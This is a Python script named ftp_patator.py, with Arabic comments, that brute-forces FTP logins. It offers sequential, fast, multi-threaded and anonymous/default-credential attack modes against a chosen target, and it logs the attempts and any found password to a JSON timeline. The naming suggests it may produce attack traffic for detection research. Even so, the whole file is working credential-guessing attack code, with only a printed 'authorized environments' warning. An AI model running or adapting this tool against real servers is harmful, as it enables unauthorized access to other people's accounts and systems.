# ftp_patator.py
import ftplib
import threading
import time
import random
import json
from datetime import datetime

# ======== CONFIG ========
TARGET_IP = "192.168.17.192"
TARGET_PORT = 21
USERNAME = "workstation"
WORDLIST_PATH = "D:\\project#\\script\\attack\\passwd.txt"
LOG_FILE = "ftp_patator_timeline.json"

class FTPPatatorGenerator:
    """FTP Brute Force Attack Generator"""
    
    def __init__(self, target_ip, target_port, username):
        self.target_ip = target_ip
        self.target_port = target_port
        self.username = username
        self.attacks = []
        self.attempts = 0
        self.stop_attack = False
        self.success = False
        self.found_password = None
    
    def log_attack_start(self, attack_type, description):
        """تسجيل بداية الهجوم"""
        self.current_attack = {
            "attack_type": attack_type,
            "description": description,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "username": self.username,
            "start_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'),
            "start_timestamp": time.time(),
        }
        print(f"\n{'='*60}")
        print(f"[+] Attack: {attack_type}")
        print(f"[+] Target: {self.target_ip}:{self.target_port}")
        print(f"[+] Username: {self.username}")
        print(f"[+] Start: {self.current_attack['start_time']}")
        print(f"{'='*60}\n")
        
        self.stop_attack = False
        self.attempts = 0
    
    def log_attack_end(self):
        """تسجيل نهاية الهجوم"""
        self.stop_attack = True
        
        self.current_attack['end_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
        self.current_attack['end_timestamp'] = time.time()
        self.current_attack['duration_seconds'] = round(
            self.current_attack['end_timestamp'] - self.current_attack['start_timestamp'], 2
        )
        self.current_attack['attempts'] = self.attempts
        self.current_attack['success'] = self.success
        self.current_attack['found_password'] = self.found_password
        
        print(f"\n[✓] Attack completed")
        print(f"[✓] Duration: {self.current_attack['duration_seconds']}s")
        print(f"[✓] Attempts: {self.attempts}")
        if self.success:
            print(f"[✓] Password found: {self.found_password}")
        print()
        
        self.attacks.append(self.current_attack)
    
    def save_timeline(self):
        """حفظ الـ timeline"""
        with open(LOG_FILE, 'w') as f:
            json.dump(self.attacks, f, indent=2)
        print(f"\n[✓] Timeline saved to: {LOG_FILE}")


def load_passwords(wordlist_path, max_passwords=None):
    """تحميل كلمات السر"""
    try:
        with open(wordlist_path, 'r', encoding='latin-1', errors='ignore') as f:
            passwords = []
            for i, line in enumerate(f):
                if max_passwords and i >= max_passwords:
                    break
                pwd = line.strip()
                if pwd:
                    passwords.append(pwd)
            return passwords
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        return []


# ======== 1. Sequential FTP Brute Force ========
def ftp_sequential_attack(attacker, passwords, delay=1):
    """هجوم تسلسلي بطيء"""
    attacker.log_attack_start("FTP_SEQUENTIAL", "Sequential FTP brute force")
    
    for password in passwords:
        if attacker.stop_attack:
            break
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(attacker.target_ip, attacker.target_port, timeout=5)
            ftp.login(attacker.username, password)
            
            print(f"[✓] SUCCESS! Password: {password}")
            attacker.success = True
            attacker.found_password = password
            ftp.quit()
            break
            
        except ftplib.error_perm:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
        
        attacker.attempts += 1
        time.sleep(delay)
    
    attacker.log_attack_end()


# ======== 2. Fast FTP Brute Force ========
def ftp_fast_attack(attacker, passwords, delay=0.1):
    """هجوم سريع"""
    attacker.log_attack_start("FTP_FAST", "Fast FTP brute force")
    
    for password in passwords:
        if attacker.stop_attack:
            break
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(attacker.target_ip, attacker.target_port, timeout=3)
            ftp.login(attacker.username, password)
            
            print(f"[✓] SUCCESS! Password: {password}")
            attacker.success = True
            attacker.found_password = password
            ftp.quit()
            break
            
        except ftplib.error_perm:
            if attacker.attempts % 50 == 0:
                print(f"[*] Attempts: {attacker.attempts}")
        except:
            pass
        
        attacker.attempts += 1
        time.sleep(delay)
    
    attacker.log_attack_end()


# ======== 3. Multi-threaded FTP Attack ========
def ftp_multithread_attack(attacker, passwords, threads=5):
    """هجوم بـ threads متعددة"""
    attacker.log_attack_start("FTP_MULTITHREAD", "Multi-threaded FTP brute force")
    
    password_queue = list(passwords)
    lock = threading.Lock()
    
    def worker():
        while password_queue and not attacker.stop_attack:
            with lock:
                if not password_queue:
                    break
                password = password_queue.pop(0)
            
            try:
                ftp = ftplib.FTP()
                ftp.connect(attacker.target_ip, attacker.target_port, timeout=5)
                ftp.login(attacker.username, password)
                
                print(f"[✓] SUCCESS! Password: {password}")
                attacker.success = True
                attacker.found_password = password
                attacker.stop_attack = True
                ftp.quit()
                break
                
            except ftplib.error_perm:
                pass
            except:
                pass
            
            with lock:
                attacker.attempts += 1
                if attacker.attempts % 100 == 0:
                    print(f"[*] Attempts: {attacker.attempts}")
            
            time.sleep(random.uniform(0.5, 1.5))
    
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    attacker.log_attack_end()


# ======== 4. Anonymous FTP Check ========
def ftp_anonymous_check(attacker):
    """فحص Anonymous login"""
    attacker.log_attack_start("FTP_ANONYMOUS", "Anonymous FTP login check")
    
    anonymous_users = ['anonymous','workstaion', 'ftp', 'guest']
    anonymous_passwords = ['', 'anonymous', 'ftp','pwn', 'guest', 'test@test.com']
    
    for user in anonymous_users:
        for password in anonymous_passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(attacker.target_ip, attacker.target_port, timeout=5)
                ftp.login(user, password)
                
                print(f"[✓] Anonymous access! User: {user}, Pass: {password}")
                attacker.success = True
                attacker.found_password = f"{user}:{password}"
                ftp.quit()
                break
                
            except:
                pass
            
            attacker.attempts += 1
            time.sleep(1)
        
        if attacker.success:
            break
    
    attacker.log_attack_end()


# ======== MAIN ========
def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='FTP Patator Attack Generator')
    parser.add_argument('-t', '--target', required=True, help='Target IP')
    parser.add_argument('-p', '--port', type=int, default=21, help='FTP port')
    parser.add_argument('-u', '--username', default='ftp', help='Username')
    parser.add_argument('-w', '--wordlist', default=WORDLIST_PATH, help='Wordlist path')
    parser.add_argument('-n', '--num-passwords', type=int, default=500, 
                       help='Number of passwords to try')
    parser.add_argument('-a', '--attack',
                       choices=['sequential', 'fast', 'multithread', 'anonymous', 'all'],
                       default='all',
                       help='Attack type')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("FTP PATATOR ATTACK GENERATOR")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Username: {args.username}")
    print(f"Attack: {args.attack}")
    print("="*60 + "\n")
    
    print("⚠️  WARNING: Use only in authorized environments!\n")
    
    input("Press ENTER to start...")
    
    attacker = FTPPatatorGenerator(args.target, args.port, args.username)
    
    # تحميل passwords
    print(f"[+] Loading passwords from {args.wordlist}...")
    passwords = load_passwords(args.wordlist, args.num_passwords)
    print(f"[+] Loaded {len(passwords)} passwords\n")
    
    if not passwords:
        print("[!] No passwords loaded. Exiting.")
        return
    
    try:
        if args.attack == 'sequential':
            ftp_sequential_attack(attacker, passwords)
        elif args.attack == 'fast':
            ftp_fast_attack(attacker, passwords)
        elif args.attack == 'multithread':
            ftp_multithread_attack(attacker, passwords)
        elif args.attack == 'anonymous':
            ftp_anonymous_check(attacker)
        elif args.attack == 'all':
            ftp_anonymous_check(attacker)
            time.sleep(10)
            ftp_sequential_attack(attacker, passwords[:100])
            time.sleep(10)
            ftp_fast_attack(attacker, passwords[100:300])
            time.sleep(10)
            ftp_multithread_attack(attacker, passwords[300:500])
    
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
    
    finally:
        attacker.save_timeline()


if __name__ == "__main__":
    main()
